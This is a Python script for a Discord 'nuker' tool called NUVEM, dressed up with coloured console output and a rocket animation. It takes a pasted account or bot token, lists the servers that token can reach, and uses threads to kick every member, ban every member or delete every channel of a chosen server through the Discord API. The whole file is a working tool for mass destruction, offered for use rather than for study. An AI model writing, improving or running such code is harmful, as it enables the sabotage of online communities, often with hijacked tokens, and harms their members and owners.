import requests
import threading
import os
import time
import random
from colorama import Fore, init

init(autoreset=True)

DEVIL_COLORS = [Fore.RED, Fore.MAGENTA, Fore.CYAN, Fore.YELLOW, Fore.LIGHTRED_EX]

def rgb_print(text):
    color = random.choice(DEVIL_COLORS)
    print(color + text)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def flying_rocket_animation():
    clear_screen()
    rocket = [
        "       /\\",
        "      /  \\",
        "     |    |",
        "     |Nuvem|",
        "     |____|",
        "     | || |",
        "     | || |",
        "     | || |",
        "    /_||_\\"
    ]
    for i in range(8):
        clear_screen()
        print("\n" * (8 - i))
        for line in rocket:
            print(" " * i + random.choice(DEVIL_COLORS) + line)
        time.sleep(0.1)
    rgb_print("🔥 Action Launched. Rocket has been fired! 🔥")

class Nuvem:
    def __init__(self, token):
        self.token = token
        self.headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }
        self.base_url = "https://discord.com/api/v10"

    def get_guilds(self):
        res = requests.get(f"{self.base_url}/users/@me/guilds", headers=self.headers)
        if res.status_code == 200:
            return res.json()
        return []

    def get_members(self, guild_id):
        res = requests.get(f"{self.base_url}/guilds/{guild_id}/members?limit=1000", headers=self.headers)
        return res.json() if res.status_code == 200 else []

    def get_channels(self, guild_id):
        res = requests.get(f"{self.base_url}/guilds/{guild_id}/channels", headers=self.headers)
        return res.json() if res.status_code == 200 else []

    def delete_channel(self, guild_id, channel_id):
        return requests.delete(f"{self.base_url}/channels/{channel_id}", headers=self.headers)

    def ban_member(self, guild_id, user_id):
        return requests.put(f"{self.base_url}/guilds/{guild_id}/bans/{user_id}", headers=self.headers)

    def kick_member(self, guild_id, user_id):
        return requests.delete(f"{self.base_url}/guilds/{guild_id}/members/{user_id}", headers=self.headers)

def run_threads(target_func, data):
    threads = []
    for item in data:
        t = threading.Thread(target=target_func, args=(item,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

def main():
    clear_screen()
    rgb_print("💀 Welcome to NUVEM - Devil Nuker 💀\n")

    token = input(Fore.CYAN + "Paste your token: ")
    bot = Nuvem(token)

    guilds = bot.get_guilds()
    if not guilds:
        rgb_print("No accessible servers found with this token.")
        return

    rgb_print("\nAvailable Servers:")
    for idx, g in enumerate(guilds):
        print(Fore.LIGHTMAGENTA_EX + f"[{idx}] {g['name']} (ID: {g['id']})")

    try:
        choice = int(input(Fore.CYAN + "\nSelect server by number: "))
        guild_id = guilds[choice]['id']
    except:
        rgb_print("Invalid selection.")
        return

    while True:
        clear_screen()
        rgb_print("💀 NUVEM DEVIL MENU 💀")
        print("""
[1] Kick All Members
[2] Ban All Members
[3] Delete All Channels
[4] Exit
        """)

        option = input(Fore.CYAN + "Choose an action: ")
        flying_rocket_animation()

        if option == "1":
            members = bot.get_members(guild_id)
            run_threads(lambda m: bot.kick_member(guild_id, m['user']['id']), members)
            rgb_print("✅ Finished kicking members.")

        elif option == "2":
            members = bot.get_members(guild_id)
            run_threads(lambda m: bot.ban_member(guild_id, m['user']['id']), members)
            rgb_print("✅ Finished banning members.")

        elif option == "3":
            channels = bot.get_channels(guild_id)
            run_threads(lambda c: bot.delete_channel(guild_id, c['id']), channels)
            rgb_print("✅ All channels deleted.")

        elif option == "4":
            rgb_print("Goodbye from NUVEM.")
            break

        else:
            rgb_print("Invalid option.")
        
        input(Fore.GREEN + "Press Enter to return to menu...")

if __name__ == "__main__":
    main()